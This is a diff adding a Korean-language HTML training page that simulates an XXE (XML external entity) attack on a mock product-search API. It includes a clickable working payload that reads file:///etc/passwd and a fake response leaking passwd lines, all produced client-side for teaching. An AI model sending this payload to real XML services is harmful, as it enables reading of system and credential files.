@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE Injection</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+KR:wght@300;400;500;700&display=swap');
+        body { font-family: 'Noto Sans KR', sans-serif; }
+        .code-font { font-family: 'JetBrains Mono', monospace; }
+    </style>
+</head>
+<body class="bg-slate-50 p-8 h-screen flex flex-col">
+
+    <div class="mb-6">
+        <div class="flex items-center gap-3 mb-2">
+            <div class="p-2 bg-pink-100 text-pink-600 rounded-lg">
+                <i class="fas fa-file-code text-xl"></i>
+            </div>
+            <h1 class="text-2xl font-bold text-slate-800">XXE Injection (XML External Entity)</h1>
+        </div>
+        <p class="text-slate-500 text-sm">
+            취약한 XML 파서가 외부 엔티티 참조를 처리할 때 발생하는 취약점으로, 공격자가 시스템 파일을 읽거나 내부 네트워크를 스캔할 수 있습니다.
+        </p>
+    </div>
+
+    <div class="flex-1 grid grid-cols-1 md:grid-cols-2 gap-8">
+        
+        <!-- Input Area -->
+        <div class="flex flex-col gap-4">
+            <div class="bg-white p-6 rounded-xl shadow-sm border border-slate-200 flex-1">
+                <h3 class="font-bold text-lg mb-4 text-slate-700">제품 검색 API (XML)</h3>
+                <textarea id="xml-input" class="w-full h-48 p-4 border border-slate-300 rounded code-font text-sm bg-slate-50 focus:ring-2 focus:ring-pink-500 outline-none" spellcheck="false">
+<?xml version="1.0" encoding="UTF-8"?>
+<search>
+  <keyword>iphone</keyword>
+</search></textarea>
+                
+                <div class="flex justify-between mt-4">
+                    <button onclick="resetXML()" class="text-sm text-slate-500 hover:text-slate-700 underline">Reset</button>
+                    <button onclick="simXXE()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-2 px-6 rounded transition">
+                        XML 전송
+                    </button>
+                </div>
+            </div>
+
+            <div class="bg-slate-100 p-4 rounded-xl border border-slate-200">
+                <p class="font-bold text-slate-600 mb-2">Exploit Payload:</p>
+                <div class="bg-white p-3 border border-slate-300 rounded cursor-pointer hover:bg-pink-50 transition group" onclick="setPayload()">
+                    <code class="text-pink-600 text-xs block whitespace-pre-wrap group-hover:text-pink-700">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; 
+]&gt;
+&lt;search&gt;
+  &lt;keyword&gt;&xxe;&lt;/keyword&gt;
+&lt;/search&gt;</code>
+                    <div class="text-[10px] text-slate-400 mt-2 text-right">클릭하여 적용</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Output Area -->
+        <div class="bg-slate-900 rounded-xl shadow-lg border border-slate-700 p-6 flex flex-col">
+            <div class="flex justify-between items-center mb-4 border-b border-slate-700 pb-2">
+                <span class="text-slate-400 font-mono text-xs">Server Response</span>
+                <span id="status-badge" class="bg-green-500 text-slate-900 text-[10px] font-bold px-2 py-0.5 rounded">200 OK</span>
+            </div>
+            
+            <div id="response-output" class="flex-1 font-mono text-sm text-slate-300 overflow-auto whitespace-pre-wrap">Waiting for request...</div>
+        </div>
+    </div>
+
+    <script>
+        const defaultXML = `<?xml version="1.0" encoding="UTF-8"?>\n<search>\n  <keyword>iphone</keyword>\n</search>`;
+        
+        const exploitXML = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<search>
+  <keyword>&xxe;</keyword>
+</search>`;
+
+        function resetXML() {
+            document.getElementById('xml-input').value = defaultXML;
+        }
+
+        function setPayload() {
+            document.getElementById('xml-input').value = exploitXML;
+        }
+
+        function simXXE() {
+            const input = document.getElementById('xml-input').value;
+            const output = document.getElementById('response-output');
+            const badge = document.getElementById('status-badge');
+
+            output.innerHTML = '<span class="text-yellow-400">Processing XML...</span>';
+            
+            setTimeout(() => {
+                if (input.includes('file:///etc/passwd') && input.includes('&xxe;')) {
+                    // Success Scenario
+                    const passwdContent = `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+... (system file leaked)`;
+                    
+                    output.innerHTML = `<span class="text-green-400">Found results for keyword:</span>\n\n<span class="text-red-400 font-bold">${passwdContent}</span>`;
+                    badge.innerText = "XXE SUCCESS";
+                    badge.className = "bg-red-500 text-white text-[10px] font-bold px-2 py-0.5 rounded animate-pulse";
+                } else {
+                    // Normal Scenario
+                    output.innerHTML = `<span class="text-green-400">Search results for "iphone":</span>\n\n1. iPhone 15 Pro - $999\n2. iPhone 14 - $799\n3. iPhone SE - $429`;
+                    badge.innerText = "200 OK";
+                    badge.className = "bg-green-500 text-slate-900 text-[10px] font-bold px-2 py-0.5 rounded";
+                }
+            }, 600);
+        }
+    </script>
+</body>
+</html>
